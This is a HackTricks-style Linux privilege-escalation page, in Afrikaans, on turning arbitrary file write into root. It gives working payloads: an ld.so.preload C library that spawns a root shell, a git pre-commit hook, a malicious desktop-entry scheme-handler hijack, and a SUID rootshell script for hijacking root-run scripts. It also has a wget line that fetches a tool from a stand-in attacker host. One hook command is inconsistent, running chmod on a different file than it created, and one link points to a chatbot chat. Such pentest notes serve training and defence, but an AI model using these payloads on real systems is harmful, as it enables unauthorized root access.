# Arbitrary File Write to Root

{{#include ../../banners/hacktricks-training.md}}

### /etc/ld.so.preload

Hierdie lêer werk soos die **`LD_PRELOAD`** omgewingveranderlike, maar dit werk ook in **SUID binaries**.\
As jy dit kan skep of wysig, kan jy eenvoudig 'n **pad na 'n biblioteek wat saam met elke uitgevoerde binary gelaai sal word** byvoeg.

Byvoorbeeld: `echo "/tmp/pe.so" > /etc/ld.so.preload`
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unlink("/etc/ld.so.preload");
setgid(0);
setuid(0);
system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
### Git hooks

[**Git hooks**](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks) is **skripte** wat **uitgevoer** word by verskeie **gebeurtenisse** in 'n git repository soos wanneer 'n commit geskep word, 'n merge... As 'n **geprivilegieerde skrip of gebruiker** hierdie aksies gereeld uitvoer en dit moontlik is om in die **`.git` gids** te **skryf**, kan dit gebruik word om **privesc**.

Byvoorbeeld, dit is moontlik om 'n **skrip te genereer** in 'n git repo in **`.git/hooks`** sodat dit altyd uitgevoer word wanneer 'n nuwe commit geskep word:
```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/b' > pre-commit
chmod +x pre-commit
```
### Cron & Time-lêers

TODO

### Diens- & Socket-lêers

TODO

### binfmt_misc

Die lêer geleë in `/proc/sys/fs/binfmt_misc` dui aan watter binary watter tipe lêers moet uitvoer. TODO: kyk na die vereistes om dit te misbruik om 'n rev shell uit te voer wanneer 'n algemene lêertipe oop is.

### Oorskryf skema-handlers (soos http: of https:)

'n Aanvaller met skryftoestemmings na 'n slagoffer se konfigurasiegidse kan maklik lêers vervang of skep wat stelselgedrag verander en tot onbedoelde kode-uitvoering lei. Deur die `$HOME/.config/mimeapps.list`-lêer aan te pas om HTTP- en HTTPS-URL-handlers na 'n kwaadwillige lêer te verwys (bv. deur `x-scheme-handler/http=evil.desktop` te stel), verseker die aanvaller dat **klik op enige http- of https-skakel die kode wat in daardie `evil.desktop`-lêer gespesifiseer is, aktiveer**. Byvoorbeeld, nadat die volgende kwaadwillige kode in `evil.desktop` in `$HOME/.local/share/applications` geplaas is, voer enige eksterne URL-kliek die ingebedde opdrag uit:
```bash
[Desktop Entry]
Exec=sh -c 'zenity --info --title="$(uname -n)" --text="$(id)"'
Type=Application
Name=Evil Desktop Entry
```
Vir meer inligting kyk na [**this post**](https://chatgpt.com/c/67fac01f-0214-8006-9db3-19c40e45ee49) waar dit gebruik is om 'n werklike kwesbaarheid te benut.

### Root wat user-writable scripts/binaries uitvoer

As 'n geprivilegieerde workflow iets soos `/bin/sh /home/username/.../script` (of enige binary binne 'n gids wat aan 'n ongeprivilegieerde gebruiker behoort) uitvoer, kan jy dit kaap:

- **Detecteer die uitvoering:** hou prosesse dop met [pspy](https://github.com/DominicBreuker/pspy) om root te vang wat deur die gebruiker beheerste paaie aanroep:
```bash
wget http://attacker/pspy64 -O /dev/shm/pspy64
chmod +x /dev/shm/pspy64
/dev/shm/pspy64   # wait for root commands pointing to your writable path
```
- **Confirm writeability:** verseker dat sowel die teikenlêer as die gids waarin dit is deur jou gebruiker besit en skryfbaar is.
- **Hijack the target:** rugsteun die oorspronklike binary/script en laat 'n payload val wat 'n SUID shell skep (of enige ander root action), en herstel dan permissies:
```bash
mv server-command server-command.bk
cat > server-command <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootshell
chown root:root /tmp/rootshell
chmod 6777 /tmp/rootshell
EOF
chmod +x server-command
```
- **Aktiveer die geprivilegieerde aksie** (bv. deur 'n UI-knoppie te druk wat die helper spawn). Wanneer root die hijacked path weer uitvoer, gryp die escalated shell met `./rootshell -p`.

## Verwysings

- [HTB Bamboo – hijacking a root-executed script in a user-writable PaperCut directory](https://0xdf.gitlab.io/2026/02/03/htb-bamboo.html)

{{#include ../../banners/hacktricks-training.md}}
